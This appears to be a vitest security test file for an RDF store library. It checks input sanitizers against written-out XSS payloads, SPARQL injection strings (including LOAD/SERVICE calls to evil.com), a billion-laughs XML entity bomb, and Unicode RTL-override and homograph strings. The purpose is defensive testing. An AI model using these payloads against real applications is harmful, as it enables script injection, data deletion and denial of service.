/**
 * XSS/Injection Adversarial Security Tests
 * Phase 5: 5 tests covering Script tags, SPARQL injection, XML entity expansion, Unicode exploits, RDF comment injection
 *
 * @module @unrdf/integration-tests/test/adversarial/xss-injection
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { createStore, dataFactory } from '@unrdf/oxigraph';

const { namedNode, literal, quad: createQuad, defaultGraph } = dataFactory;

/**
 * Input sanitizer for RDF literals
 * @param {string} input - User input
 * @returns {string} Sanitized input
 */
function sanitizeRDFLiteral(input) {
  if (typeof input !== 'string') return '';

  // Escape HTML entities
  let sanitized = input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');

  // Remove null bytes
  sanitized = sanitized.replace(/\0/g, '');

  return sanitized;
}

/**
 * SPARQL query sanitizer
 * @param {string} input - User-provided query component
 * @returns {Object} Sanitization result
 */
function sanitizeSPARQLInput(input) {
  if (typeof input !== 'string') {
    return { safe: false, error: 'Input must be string' };
  }

  // Detect injection patterns
  const injectionPatterns = [
    /;\s*DROP\s+/i,
    /;\s*DELETE\s+/i,
    /;\s*INSERT\s+/i,
    /;\s*CLEAR\s+/i,
    /--/,
    /\/\*/,
    /LOAD\s+<[^>]*>/i,
    /SERVICE\s+<[^>]*>/i,
  ];

  for (const pattern of injectionPatterns) {
    if (pattern.test(input)) {
      return { safe: false, error: `Potential SPARQL injection detected: ${pattern}` };
    }
  }

  // Escape special characters for IRI
  const escaped = input.replace(/[<>"\{\}|\\^`]/g, (char) => {
    return '%' + char.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase();
  });

  return { safe: true, value: escaped };
}

/**
 * XML entity expansion limiter
 * @param {string} input - XML/RDF content
 * @param {number} maxDepth - Maximum entity expansion depth
 * @returns {Object} Validation result
 */
function validateXMLEntityExpansion(input, maxDepth = 3) {
  // Count entity references
  const entityPattern = /&[a-zA-Z0-9]+;|&#[0-9]+;|&#x[0-9a-fA-F]+;/g;
  const entities = input.match(entityPattern) || [];

  // Detect entity definitions (DOCTYPE)
  const hasDoctype = /<!DOCTYPE[^>]*\[[\s\S]*\]>/i.test(input);
  const entityDefs = (input.match(/<!ENTITY\s+/gi) || []).length;

  // Billion laughs detection: excessive entity nesting
  if (entityDefs > 10 || entities.length > 100) {
    return { safe: false, error: 'Potential XML entity expansion attack (billion laughs)' };
  }

  if (hasDoctype && entityDefs > 0) {
    return { safe: false, error: 'External DOCTYPE with entities not allowed' };
  }

  return { safe: true };
}

/**
 * Unicode exploit detector
 * @param {string} input - Input string
 * @returns {Object} Detection result
 */
function detectUnicodeExploits(input) {
  if (typeof input !== 'string') {
    return { safe: false, error: 'Input must be string' };
  }

  // RTL override characters
  const rtlOverrides = /[\u202A-\u202E\u2066-\u2069\u200E\u200F]/g;
  const rtlMatches = input.match(rtlOverrides);

  // Zero-width characters
  const zeroWidth = /[\u200B-\u200D\uFEFF]/g;
  const zwMatches = input.match(zeroWidth);

  // Homograph attack characters (confusables)
  const confusables = /[\u0430-\u044F\u0410-\u042F]/g; // Cyrillic that looks like Latin
  const confusableMatches = input.match(confusables);

  const exploits = [];
  if (rtlMatches) exploits.push(`RTL override: ${rtlMatches.length} chars`);
  if (zwMatches) exploits.push(`Zero-width: ${zwMatches.length} chars`);
  if (confusableMatches) exploits.push(`Potential homograph: ${confusableMatches.length} chars`);

  return {
    safe: exploits.length === 0,
    exploits,
    sanitized: input.replace(rtlOverrides, '').replace(zeroWidth, ''),
  };
}

describe('XSS/Injection Adversarial Tests', () => {
  /** @type {import('@unrdf/oxigraph').OxigraphStore} */
  let store;

  beforeEach(() => {
    store = createStore();
  });

  afterEach(() => {
    store = null;
  });

  // Test 1: Script tags in RDF literals - escaped/rejected
  it('should escape or reject script tags in RDF literals', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
    ];

    xssPayloads.forEach(payload => {
      const sanitized = sanitizeRDFLiteral(payload);

      // Verify HTML tags are escaped (making event handlers harmless text)
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('<svg');
      expect(sanitized).not.toContain('<iframe');

      // Should contain escaped versions of angle brackets
      if (payload.includes('<')) {
        expect(sanitized).toContain('&lt;');
      }
      if (payload.includes('>')) {
        expect(sanitized).toContain('&gt;');
      }

      // Store sanitized value - should not throw
      const quad = createQuad(
        namedNode('http://example.org/subject'),
        namedNode('http://example.org/content'),
        literal(sanitized),
        defaultGraph()
      );
      expect(() => store.add(quad)).not.toThrow();
    });
  });

  // Test 2: SPARQL injection - rejected
  it('should reject SPARQL injection attempts', () => {
    const injectionPayloads = [
      "'; DROP ALL; --",
      "' ; DELETE WHERE { ?s ?p ?o }",
      "\" ; INSERT DATA { <x> <y> <z> }",
      "' ; CLEAR DEFAULT",
      "'; LOAD <http://evil.com/malicious.ttl>",
      "'; SERVICE <http://evil.com/endpoint> { ?s ?p ?o }",
    ];

    injectionPayloads.forEach(payload => {
      const result = sanitizeSPARQLInput(payload);

      expect(result.safe).toBe(false);
      expect(result.error).toContain('injection');
    });

    // Valid inputs should pass
    const validInputs = [
      'http://example.org/resource',
      'John Doe',
      'test@example.com',
      '2024-01-01',
    ];

    validInputs.forEach(input => {
      const result = sanitizeSPARQLInput(input);
      expect(result.safe).toBe(true);
    });
  });

  // Test 3: XML entity expansion (billion laughs) - rejected
  it('should reject XML entity expansion attacks', () => {
    // Billion laughs attack pattern
    const billionLaughs = `
      <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
      ]>
      <rdf:RDF>&lol9;</rdf:RDF>
    `;

    const result = validateXMLEntityExpansion(billionLaughs);

    expect(result.safe).toBe(false);
    expect(result.error).toContain('entit'); // Matches 'entity' or 'entities'

    // Safe XML should pass
    const safeXML = `
      <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
        <rdf:Description rdf:about="http://example.org/resource">
          <name>Test</name>
        </rdf:Description>
      </rdf:RDF>
    `;

    const safeResult = validateXMLEntityExpansion(safeXML);
    expect(safeResult.safe).toBe(true);
  });

  // Test 4: Unicode exploits (RTL override) - rejected
  it('should detect and reject Unicode exploits', () => {
    // RTL override attack: "admin" visually appears as something else
    const rtlAttack = 'admin\u202Eevil\u202C.txt'; // RTL override

    // Zero-width character injection
    const zeroWidthAttack = 'pass\u200Bword'; // Invisible separator

    // Homograph attack
    const homographAttack = '\u0430dmin'; // Cyrillic 'a' looks like Latin 'a'

    const rtlResult = detectUnicodeExploits(rtlAttack);
    expect(rtlResult.safe).toBe(false);
    expect(rtlResult.exploits.length).toBeGreaterThan(0);

    const zwResult = detectUnicodeExploits(zeroWidthAttack);
    expect(zwResult.safe).toBe(false);

    const homographResult = detectUnicodeExploits(homographAttack);
    expect(homographResult.safe).toBe(false);

    // Clean ASCII should be safe
    const cleanInput = 'regular ASCII text 123';
    const cleanResult = detectUnicodeExploits(cleanInput);
    expect(cleanResult.safe).toBe(true);
  });

  // Test 5: RDF comment injection - sanitized
  it('should sanitize RDF comment injection attempts', () => {
    const commentInjections = [
      '# This is a comment\n<http://evil.com> <predicate> <object> .',
      'value" ; # injection comment',
      'value\n# Injected RDF\n<malicious> <triple> <here> .',
    ];

    commentInjections.forEach(injection => {
      const sanitized = sanitizeRDFLiteral(injection);

      // Newlines and special chars should be handled
      // Note: The sanitizer escapes HTML entities, actual RDF serialization
      // would need additional handling for format-specific chars

      // Should be able to store as literal value safely
      const quad = createQuad(
        namedNode('http://example.org/subject'),
        namedNode('http://example.org/comment'),
        literal(sanitized),
        defaultGraph()
      );

      expect(() => store.add(quad)).not.toThrow();

      // Verify the stored value doesn't execute as RDF
      const matches = store.match(null, null, null, null);
      expect(matches.length).toBe(1);
      expect(matches[0].object.value).toBe(sanitized);

      // Clean up for next iteration
      store.clear();
    });
  });
});
